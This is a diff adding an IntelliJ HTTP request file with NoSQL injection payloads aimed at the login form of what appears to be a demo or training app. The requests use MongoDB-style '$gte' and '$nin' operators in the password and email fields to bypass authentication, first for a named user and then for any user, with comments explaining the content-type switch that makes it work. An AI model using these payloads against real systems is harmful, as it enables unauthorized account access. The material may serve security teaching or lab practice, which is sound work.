@@ -1,0 +1,43 @@
+### those are IntelliJ's test HTTP request (!)
+### the idea behind is to change the content-type to application-json
+### and this way trick the server to useing the JS objects instead of strings
+
+POST http://demo.yonita.com:3000/
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+
+logemail=test&logpassword={ "$gte": "" }
+
+###
+### NoSQL injection to bypass authentication for a known user
+POST http://demo.yonita.com:3000/
+Accept: */*
+Content-Type: application/json
+
+{
+  "logemail": "patrycja",
+  "logpassword": {
+    "$gte": ""
+  }
+}
+
+###
+### NoSQL injection to bypass authentication for any user
+POST http://demo.yonita.com:3000/
+Accept: */*
+Content-Type: application/json
+
+{
+  "logemail": {
+    "$nin": [
+      "patrycja"
+    ]
+  },
+  "logpassword": {
+    "$gte": ""
+  }
+}
+
+###
+
+###
